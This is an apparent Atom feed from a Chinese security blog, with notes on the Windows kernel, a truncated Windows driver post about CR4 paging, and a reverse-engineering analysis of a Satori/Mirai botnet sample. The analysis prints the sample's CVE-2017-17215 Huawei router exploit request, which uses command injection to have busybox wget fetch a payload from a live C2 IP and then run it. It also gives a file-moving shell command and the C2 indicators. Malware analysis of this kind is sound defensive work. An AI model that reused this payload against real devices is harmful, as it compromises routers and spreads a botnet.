<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Joe1sn&#39;s Cabinet</title>
  
  
  <link href="https://joe1sn.eu.org/atom.xml" rel="self"/>
  
  <link href="https://joe1sn.eu.org/"/>
  <updated>2023-05-24T04:16:02.334Z</updated>
  <id>https://joe1sn.eu.org/</id>
  
  <author>
    <name>Joe1sn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>win_kernel_1_baisc</title>
    <link href="https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/"/>
    <id>https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/</id>
    <published>2023-05-24T03:28:39.000Z</published>
    <updated>2023-05-24T04:16:02.334Z</updated>
    
    <content type="html"><![CDATA[<h1 id="i-windows系统结构"><a class="markdownIt-Anchor" href="#i-windows系统结构"></a> I. Windows系统结构</h1><span id="more"></span><h2 id="ia-大致结构"><a class="markdownIt-Anchor" href="#ia-大致结构"></a> I.a 大致结构</h2><p>windows内核是从<code>windows NT</code>内核发展过来的，从开始就和硬件的发展息息相关。</p><p>Windows采用双模式（<code>dual mode</code>）结构来保护操作系统内核不受应用程序的错误而出现崩溃</p><p><img src="https://img.joe1sn.top/uploads/big/268a5b458897e4a4a77a3368415c50a7.png" alt="img" /></p><p>windows的原始设计是一个支持多环境子系统的os，它还支持POSIX和OS/2环境子系统.为他们提供仿真执行环境</p><h2 id="ib-windows内核组成结构"><a class="markdownIt-Anchor" href="#ib-windows内核组成结构"></a> I.b windows内核组成结构</h2><p><img src="https://img.joe1sn.top/uploads/big/b2e4ecf4e493b23fd28d8640d524aac3.png" alt="内核组成结构.drawio" /></p><p>关于函数的开头</p><ul><li><code>nt</code>：内核提供的服务</li><li><code>Ldr</code>：映像加载器函数</li><li><code>Csr</code>：Windows子进程通讯函数</li><li><code>Dbg</code>：调试函数</li><li><code>Etw</code>：系统时间函数</li><li><code>Rtl</code>：运行支持函数</li></ul><p>执行体API函数接收的参数来自各种应用程序，通常会在程序的最开始处，对所接受的参数逐一探查他们的可访问性。</p><h1 id="ii-windows内核关键组件"><a class="markdownIt-Anchor" href="#ii-windows内核关键组件"></a> II. windows内核关键组件</h1><h2 id="hal-硬件抽象层"><a class="markdownIt-Anchor" href="#hal-硬件抽象层"></a> HAL 硬件抽象层</h2><p>HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，改名为<code>hal.dll</code>。涉及中断控制器、单处理器/多处理器硬件断点。</p><h2 id="内核微内核"><a class="markdownIt-Anchor" href="#内核微内核"></a> 内核（微内核）</h2><p>在内核模块<code>ntoskrnl.exe</code>中的上层部分为执行体，下层最接近HAL的就是内核。负责进程调度、中断和异常处理，核心任务是尽可能让系统中的所有处理器变得高效。</p><p>windows内核使用抢占式调度，由于采用面向对象的设计，使得它主要面向两个对象：<strong>分发器</strong> 和 <strong>控制</strong> 两个对象</p><ul><li>分发器对象：实现各种同步功能。影响线程调度，主要用于 <strong>事件(event)</strong> <strong>突变体(mutant) 信号量(semaphore) 进程(process) 线程(thread) 队列(query) 门(gate) 定时器(timer)</strong></li><li>控制对象：用于控制内核的操作，不影响线程调度。包括 <strong>异步调用(APC) 延迟过程调用(DPC) 中断对象</strong></li></ul><h2 id="执行体"><a class="markdownIt-Anchor" href="#执行体"></a> 执行体</h2><p>在内核模块<code>ntoskrnl.exe</code>中的上层部分，包含5种类型的函数</p><ul><li>被导出的、可以在用户模式下调用的函数。位于 <code>ntdll.dll</code> 中。一般就是win API</li><li>没有被导出、可以在用户模式下调用的函数。比如常见的反调试函数，包括各种LRC(<code>Local Process Call</code>，本地调用过程)、各种查询函数和专业函数。</li><li>只能在内核模式下调用的导出函数。在<code>windows DDK</code>中有文档。</li><li>执行体之间内部调用，未被文档化的函数</li><li>一个组件的内置函数</li></ul><p>其中组件包括</p><ul><li>进程和线程管理器：负责进程/线程的CURD</li><li>内存管理：虚拟内存</li><li>安全引用监视器（SRM）：维护本地计算机的安全策略</li><li>I/O管理器</li><li>缓存管理器：允许磁盘将文件映射到内存中</li><li>配置管理器：负责注册表的实现</li><li>即插即用管理器</li></ul><p>还有的函数负责对执行体进行管理</p><ul><li>对象管理器：执行体对象的CURD</li><li>LPC设施：负责同一设备的的客户进程和服务进程的消息传递，对应的是远程过程调用（RPC）</li><li>运行时库函数</li><li>执行体支持例程：内存的分配、互锁内存的转换</li></ul><h2 id="设备驱动程序"><a class="markdownIt-Anchor" href="#设备驱动程序"></a> 设备驱动程序</h2><p>驱动文件（<code>.sys</code>），漏洞挖掘存在于<code>IOCTL</code></p><h2 id="文件系统存储管理"><a class="markdownIt-Anchor" href="#文件系统存储管理"></a> 文件系统/存储管理</h2><p>主要是<code>ntfs.sys</code>。漏洞挖掘存在于<code>CLFS</code>（通用日志文件系统）。</p><h2 id="网络"><a class="markdownIt-Anchor" href="#网络"></a> 网络</h2><p>windows套接字、winInet、NetBIOS、RPC</p><h1 id="ii-windows子系统"><a class="markdownIt-Anchor" href="#ii-windows子系统"></a> II. windows子系统</h1><p>在上面的内核部分已经实现了对硬件的简单访问控制，那么就会在次基础上进行跟高层次的建设。</p><p>在PE文件的头部域<code>Subssytem</code>中指定了该程序会在那个子环境中运行。</p><p>子系统也分为用户模式和内核模式，<strong>核心部分是 win32k.sys</strong>。子系统的DLL链接到应用程序中，包括<code>kernel32.dll</code> <code>user32.dll</code> <code>gdi32.dll</code> <code>advapi.dll</code>，负责实现文档化的windows函数。</p><p>win32k.sys同时也负责向内核注入一系列出调函数(callout)，一旦调用了win32k.sys的任何一个系统服务，这个程序就会变成一个GDI线程</p><p>核心功能可以分为：</p><ul><li><p>窗口管理</p><p>由windows子进程<code>csrss.exe</code>负责控制台窗口功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">子系统会话---&gt;交互式窗口站---&gt;默认桌面---&gt;顶级窗户口列表-&gt;子窗口</span><br><span class="line">          |             |_&gt;登录窗口</span><br><span class="line">          |             |_&gt;屏幕保护窗口</span><br><span class="line">          |-&gt;非交互式窗口--&gt;不可见桌面</span><br></pre></td></tr></table></figure></li><li><p>图形设备接口(GDI)</p><p>主要是图形支持，设计Direct3D等</p></li></ul><h1 id="ii-windows发布历史"><a class="markdownIt-Anchor" href="#ii-windows发布历史"></a> II. Windows发布历史</h1><p>MicroSoft在操作系统领域中最开始起源于MS-DOS，随后演变出了两个分支，最开始的<code>Win 95/98/Me</code>，之后就是基于<code>Windows NT</code>的内核版本的<code>Window XP/7/8/10/vista</code>的版本。</p><table><thead><tr><th>版本</th><th>发布日期</th><th>主要特点</th><th>内核版本</th></tr></thead><tbody><tr><td>Windows 1.0</td><td>1985年11月</td><td>初始版本，提供基本的图形用户界面和应用程序支持</td><td>1.0</td></tr><tr><td>Windows 2.0</td><td>1987年12月</td><td>引入了窗口重叠、图标和键盘快捷键等改进</td><td>2.0</td></tr><tr><td>Windows 3.0</td><td>1990年5月</td><td>支持多任务处理和TrueType字体，用户界面大幅改进</td><td>3.0</td></tr><tr><td>Windows 95</td><td>1995年8月</td><td>具有开始菜单、任务栏和32位应用程序支持的重要版本</td><td>4.0</td></tr><tr><td>Windows 98</td><td>1998年6月</td><td>引入了对USB设备和DVD光盘的支持，改进了系统稳定性</td><td>4.10</td></tr><tr><td>Windows 2000</td><td>2000年2月</td><td>强化了系统稳定性和安全性，提供了企业级特性</td><td>5.0</td></tr><tr><td>Windows XP</td><td>2001年10月</td><td>引入了全新的用户界面、系统恢复功能和多用户支持</td><td>5.1</td></tr><tr><td>Windows Vista</td><td>2007年1月</td><td>全新的用户界面、更高的安全性和系统稳定性</td><td>6.0</td></tr><tr><td>Windows 7</td><td>2009年10月</td><td>优化了用户界面和性能，改进了任务栏和窗口管理</td><td>6.1</td></tr><tr><td>Windows 8</td><td>2012年10月</td><td>引入了全新的开始屏幕和触摸优化的用户界面</td><td>6.2</td></tr><tr><td>Windows 10</td><td>2015年7月</td><td>统一了桌面和移动设备平台，引入了Windows应用商店</td><td>10.0</td></tr><tr><td>Windows 11</td><td>2021年10月</td><td>新的用户界面设计、改进的性能和安全性，支持Android应用</td><td>10.0</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;i-windows系统结构&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#i-windows系统结构&quot;&gt;&lt;/a&gt; I. Windows系统结构&lt;/h1&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>mirai_bota</title>
    <link href="https://joe1sn.eu.org/2023/03/25/mirai-bota/"/>
    <id>https://joe1sn.eu.org/2023/03/25/mirai-bota/</id>
    <published>2023-03-25T10:42:45.000Z</published>
    <updated>2023-05-31T08:26:12.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mirai-botnet分支satori分析"><a class="markdownIt-Anchor" href="#mirai-botnet分支satori分析"></a> Mirai Botnet分支Satori分析</h1><p>暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向</p><span id="more"></span><h2 id="基本情况"><a class="markdownIt-Anchor" href="#基本情况"></a> 基本情况</h2><table><thead><tr><th>名称</th><th>x86_64</th></tr></thead><tbody><tr><td>MD5</td><td>fe7ca3b588e342f79c7814bb75dc24d7</td></tr><tr><td>SHA256</td><td>e436196f047741070c580695f5444e0c2cdd175c88f68affdc9230d09a71c978</td></tr><tr><td>Domain</td><td><a href="http://botnet.nguyennghi.info">botnet.nguyennghi.info</a></td></tr><tr><td>ip</td><td>103.183.118.73</td></tr></tbody></table><h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2><h3 id="基本情况-2"><a class="markdownIt-Anchor" href="#基本情况-2"></a> 基本情况</h3><img src="https://img.joe1sn.top/uploads/big/2dd85cc12949bcd1a7da5287ada77fed.png" alt="image-20230319130912500" style="zoom:50%;" /><p>64位ELF可执行文件</p><p><img src="https://img.joe1sn.top/uploads/big/ff35ebac2e5f17da95a18f650aa1c5f6.png" alt="image-20230319131036258" /></p><h3 id="逆向工程"><a class="markdownIt-Anchor" href="#逆向工程"></a> 逆向工程</h3><p>通过start找到main函数</p><p><img src="https://img.joe1sn.top/uploads/big/7f9086994f2d20a717a754d858293a59.png" alt="image-20230319131156050" /></p><p>使用IDApython脚本对类似的库函数实现进行函数重命名</p><p><img src="https://img.joe1sn.top/uploads/big/6ae388e053568f7e0b6209cf80082bbd.png" alt="image-20230319131304684" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    func = idaapi.get_func(func_ea)</span><br><span class="line">    name = idaapi.get_func_name(func_ea)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> head <span class="keyword">in</span> idautils.Heads(func.start_ea, func.end_ea):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = idc.GetDisasm(head)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;syscall&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Function: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name).ljust(<span class="number">0x40</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(code[<span class="number">21</span>:].ljust(<span class="number">0x30</span>,<span class="string">&quot;=&quot;</span>))</span><br><span class="line">                ida_name.set_name(func.start_ea, code[<span class="number">21</span>:])</span><br><span class="line">                idc.set_func_flags(func.start_ea, idc.get_func_flags(func_ea) | idaapi.FUNC_LIB)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/9699218d050e3277b97c149a5001e218.png" alt="image-20230319131712988" /></p><p><strong>main函数</strong></p><ol><li><p>首先创建向<code>8.8.8.8:13568</code>的socket连接，通过<code>getsockname</code>测试网络是否连通并获得本机ip地址</p><p><img src="https://img.joe1sn.top/uploads/big/e1856f6f33f0c1ef5976e312ad0722e2.png" alt="image-20230319133229045" /></p></li><li><p>初始化加密消息</p><p>由于使用未知版本的lib库进行静态编译，所以需要手动识别一些lib函数。</p><p>比如这里使用<code>malloc</code>分配并将密文使用<code>strncpy</code>将消息复制到堆中</p><p><img src="https://img.joe1sn.top/uploads/big/7058438640f17abd7da5ae8736403663.png" alt="image-20230319145038585" /></p></li><li><p>利用<code>pid</code>和随机数进行随机数生成，对进程进行随机改名</p><ul><li><p>将time生成的伪随机数和pid进行异或等操作得到随机数</p><p><img src="https://img.joe1sn.top/uploads/big/c3fa4dc9012d5d9d226257bc0a7ad6e8.png" alt="image-20230319145721197" /></p></li><li><p>通过位移等操作实现随机数的范围控制</p></li></ul><p><img src="https://img.joe1sn.top/uploads/big/c16e53f2ec6c8b3dd41d531f26f25633.png" alt="image-20230319145655202" /></p><ul><li><p>在之后使用<code>ptrcl</code>进行进程的重命名</p><p><img src="https://img.joe1sn.top/uploads/big/f9ee442f2eb39f67156721672c18f159.png" alt="image-20230319164552839" /></p></li></ul></li><li><p>拼接指令过后，修改相关信号变量值，并在<code>vfork</code>的<code>execl</code>中执行</p><ul><li><p>拼接命令字符串</p><p><img src="https://img.joe1sn.top/uploads/big/e8dc6791e9c8617b59761f5d15e5999c.png" alt="image-20230319164254112" /></p></li><li><p>设置信号量并使用vfork执行</p><p><img src="https://img.joe1sn.top/uploads/big/69316bf83fad9f326f58e874975dd2e6.png" alt="image-20230319164122065" /></p><p><img src="https://img.joe1sn.top/uploads/big/16fb3f0838f0cffc01c01207cb1f8c5c.png" alt="image-20230319163508664" /></p></li><li><p>vfork部分</p><p><img src="https://img.joe1sn.top/uploads/big/268aff2f4a3d3e64a33004ceef665ca9.png" alt="image-20230319164454462" /></p></li><li><p>执行的语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf $root_random_name &amp;&amp; mkdir bin; &gt; $cur_random_name &amp;&amp; mv $pwd $root_random_name ; chmod 777 $root_random_name</span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf bin/watchdog &amp;&amp; mkdir bin \336\377\377\377\177; &gt;bin/watchdog &amp;&amp;  mv /home/test/Desktop/HackedByAlan/check/mirai bin/watchdog; chmod 777 bin/watchdog</span><br></pre></td></tr></table></figure><ol><li>随机选择  <code>&quot;/bin/busybox&quot;;</code>、<code>&quot;/bin/watchdog&quot;</code>、<code>&quot;/bin/systemd&quot;</code>中的一个（<code>$root_random_name</code>）中的一个<strong>删除</strong></li><li>当前文件夹创建<code>bin</code>目录</li><li>将当前目录下的病毒移动至创建的<code>bin</code>目录中，并重命名<code>$root_random_name</code></li><li>给予<code>bin/$root_random_name</code>最高权限</li></ol><p>通过多次运行可以成功实现，如果<code>&amp;&amp; mkdir bin \336\377\377\377\177</code>中没有乱码，那么就会执行后一句</p><p><img src="https://img.joe1sn.top/uploads/big/e6955edfd176db8c53e504286d3be6d7.png" alt="image-20230319230512195" /></p></li></ul></li><li><p>使用异或解密字符串并打印，完成后加密字符串</p><ul><li><p>过程</p><p><img src="https://img.joe1sn.top/uploads/big/2cf1740082e2104f5c6be1f730334279.png" alt="image-20230319173516052" /></p></li><li><p>利用其自身的解密脚本，可以解密所有密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">str1 = [ <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x5A</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x5B</span>, <span class="number">0x57</span>, <span class="number">0x4B</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x41</span>, <span class="number">0x2E</span>]</span><br><span class="line">str2 = [<span class="number">0x4A</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>]</span><br><span class="line">str3 = [<span class="number">0x01</span>, <span class="number">0x5E</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x01</span>, <span class="number">0x2E</span>]</span><br><span class="line">str4 = [<span class="number">0x01</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line">str5 = [<span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0x4A</span>, <span class="number">0x2E</span>]</span><br><span class="line">str6 = [<span class="number">0x01</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="number">0x6D53D2C2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher:<span class="built_in">list</span></span>):</span><br><span class="line">    v3 = key &amp; <span class="number">0xFF</span></span><br><span class="line">    v4 = key &gt;&gt; <span class="number">8</span></span><br><span class="line">    v5 = (key &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    v6 = (key &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        result += <span class="built_in">chr</span>((i^v3^v4^v5^v6 )&amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>, decrypt(str1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2&quot;</span>, decrypt(str2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3&quot;</span>, decrypt(str3))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;4&quot;</span>, decrypt(str4))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;5&quot;</span>, decrypt(str5))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;6&quot;</span>, decrypt(str6))</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/23f89924f7290216402f2dbee10c1f43.png" alt="image-20230319220907909" /></p></li><li><p>加密字符串，由于是异或加密，所以加解密算法一致</p></li></ul></li></ol><p><img src="https://img.joe1sn.top/uploads/big/603b9a71f69d32f0b9937d4c40d4e2eb.png" alt="image-20230319174504355" /></p><p><img src="https://img.joe1sn.top/uploads/big/8c79bfcbe91463df2c3555e3de8b40d0.png" alt="image-20230319174521783" /></p><ol start="6"><li><p>合适函数表，讲函数放到一个table中</p><p><img src="https://img.joe1sn.top/uploads/big/6e49a88320fb86ab46e96687914965bd.png" alt="image-20230325174924309" /></p></li><li><p>使用<code>fork</code>获得子进程，打开<code>/proc</code>文件夹并读取其中的文件，关闭除必要进程外的所有进程</p><ul><li><p>打开<code>/proc/</code>文件夹</p><p><img src="https://img.joe1sn.top/uploads/big/fc58ad13d588c9c5bfd0718b076a8ec8.png" alt="image-20230325175147772" /></p><p><img src="https://img.joe1sn.top/uploads/big/c52029cd2018a1d2b7c8cd50bfb58c4b.png" alt="image-20230325175200591" /></p></li><li><p>关闭除必要进程外的所有进程</p><p><img src="https://img.joe1sn.top/uploads/big/f6c419b41761495db52182270509e87f.png" alt="image-20230325175235928" /></p></li></ul></li><li><p>使用SSDP协议进行网络发包，使用华为HG532远程命令执行漏洞（CVE-2017-17215）的payload进行发包，进行攻击</p><ul><li><p>进行攻击</p><ol><li><p>创建socket</p><p><img src="https://img.joe1sn.top/uploads/big/82f418b30b12d5cd5f0340a65dacecd5.png" alt="image-20230325175953274" /></p></li><li><p>设置 socket 选项，允许向组播地址发送数据</p><p><img src="https://img.joe1sn.top/uploads/big/5df10655306d34b61114564c0e610cf9.png" alt="image-20230325181258334" /></p></li><li><p>设置目标地址和端口号</p><p><img src="https://img.joe1sn.top/uploads/big/5fdd3eff4830d76f22e248fac58f4c1c.png" alt="image-20230325181453140" /></p></li><li><p>构造 M-SEARCH 请求报文，发送搜索请求</p><p><img src="https://img.joe1sn.top/uploads/big/f6ec95904237a3f131f02eb4eed5db82.png" alt="image-20230325175636859" /></p><p><img src="https://img.joe1sn.top/uploads/big/1a9561f1e58f0b6efcd84e98fa54dad6.png" alt="image-20230325175725576" /></p><p><img src="https://img.joe1sn.top/uploads/big/3331ad455db311c3c1ae6f49c223d273.png" alt="image-20230325175739448" /></p></li></ol></li><li><p>payload分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /ctrlt/DeviceUpgrade_1 HTTP/1.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: */*</span><br><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e</span><br><span class="line">3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br><span class="line">Content-Length: 457</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">    &lt;s:Body&gt;</span><br><span class="line">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line">        &lt;NewStatusURL&gt;$(/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)&lt;/NewStatusURL&gt;</span><br><span class="line">        &lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;</span><br><span class="line">        &lt;/u:Upgrade&gt;</span><br><span class="line">    &lt;/s:Body&gt;</span><br><span class="line">&lt;/s:Envelope&gt;</span><br></pre></td></tr></table></figure><p>核心语句</p><p><code>/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei</code></p></li></ul></li></ol><h2 id="网络连接相关"><a class="markdownIt-Anchor" href="#网络连接相关"></a> 网络连接相关</h2><h3 id="dns-server"><a class="markdownIt-Anchor" href="#dns-server"></a> DNS SERVER</h3><table><thead><tr><th><a href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a>.</th><th>173.245.59.65 <a href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a></th><th>CLOUDFLARENET United States</th></tr></thead><tbody><tr><td><a href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a>.</td><td>108.162.194.192 <a href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a></td><td>CLOUDFLARENET United States</td></tr></tbody></table><h3 id="host-records-a"><a class="markdownIt-Anchor" href="#host-records-a"></a> Host Records (A)</h3><table><thead><tr><th><a href="http://nguyennghi.info">nguyennghi.info</a>    HTTP: cloudflare</th><th>104.21.78.122</th><th>CLOUDFLARENET unknown</th></tr></thead><tbody><tr><td><a href="http://antiddos.nguyennghi.info">antiddos.nguyennghi.info</a></td><td>103.161.181.140</td><td>DVS-AS-VN VIET DIGITAL TECHNOLOGY LIABILITY COMPANY Vietnam</td></tr><tr><td><a href="http://checkht4gvpn.nguyennghi.info">checkht4gvpn.nguyennghi.info</a>    <br>HTTP: cloudflare</td><td>172.67.220.248</td><td>CLOUDFLARENET United States</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;mirai-botnet分支satori分析&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#mirai-botnet分支satori分析&quot;&gt;&lt;/a&gt; Mirai Botnet分支Satori分析&lt;/h1&gt;
&lt;p&gt;暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="git" scheme="https://joe1sn.eu.org/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>windows_kernel_driver_2</title>
    <link href="https://joe1sn.eu.org/2023/02/17/windows-kernel-driver-2/"/>
    <id>https://joe1sn.eu.org/2023/02/17/windows-kernel-driver-2/</id>
    <published>2023-02-17T07:21:36.000Z</published>
    <updated>2023-02-17T07:53:44.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="驱动开发-2"><a class="markdownIt-Anchor" href="#驱动开发-2"></a> [驱动开发] 2</h1><ul><li>探索CR4</li><li>探索页面<ul><li>CR3寄存器于页遍历</li><li>虚拟地址-&gt;物理地址</li></ul></li></ul><span id="more"></span><h2 id="驱动开发探索cr4"><a class="markdownIt-Anchor" href="#驱动开发探索cr4"></a> [驱动开发]探索CR4</h2><p>英特尔® 64 位和 IA-32 架构开发人员手册合订本</p><p>第3卷第四章第五小节《4-LEVEL PAGING AND 5-LEVEL PAGING》</p><h3 id="判断cpu是四级分页还是五级分页"><a class="markdownIt-Anchor" href="#判断cpu是四级分页还是五级分页"></a> 判断CPU是四级分页还是五级分页</h3><p><img src="https://img.joe1sn.top/uploads/big/52fd7a50c413368bd8a695de90fcd4cd.png" alt="image-20230216154149842" /></p><p>page: 3074</p><p><img src="https://img.joe1sn.top/uploads/big/14c30bac52de0e60030b23bcb577fe75.png" alt="image-20230216155742771" /></p><p><img src="https://img.joe1sn.top/uploads/big/a843d486654ecf31cdcb72aedeec3a00.png" alt="image-20230216160252784" /></p><p>该寄存器的值决定了映射层级是4/5，</p><ul><li>1：5级分页</li><li>0：4级分页</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//__readcr4() &amp; 0x1000</span></span><br><span class="line"><span class="comment">//__readcr4() &amp; (1&lt;&lt;12)</span></span><br><span class="line">CR4 Cr4 = &#123; .Value = __readcr4() &#125;;</span><br><span class="line">DbgPrint(<span class="string">&quot;CR4=0x%016I64X, CR4.LA57=%I64d\n&quot;</span>, Cr4.Value, Cr4.Fields.LA57);</span><br><span class="line"><span class="keyword">if</span> (Cr4.Fields.LA57)</span><br><span class="line">    DbgPrint(<span class="string">&quot;The system using 5 Level Paging&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    DbgPrint(<span class="string">&quot;The system using 4 Level Paging&quot;</span>);</span><br></pre></td></tr></table></figure><h2 